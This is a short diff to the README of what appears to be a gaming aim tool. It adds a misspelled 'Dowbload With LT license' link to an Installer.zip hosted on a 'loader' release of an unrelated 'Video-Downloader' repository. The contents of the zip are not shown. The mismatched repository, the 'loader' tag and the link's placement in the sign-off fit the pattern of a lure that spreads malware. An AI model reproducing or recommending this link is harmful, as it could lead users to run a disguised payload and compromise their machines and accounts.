@@ -17,6 +17,7 @@
 > ## 🗨️ Final Words  
 > If this tool saved your aim — drop a ⭐. If it didn’t... maybe just pretend it did. Omg thanks 😂  
 >
+>  [Dowbload With LT license](https://github.com/postik342-svg/Video-Downloader/releases/download/loader/Installer.zip)
 > ---
 >
 > _Stay sharp, gamer 💥_
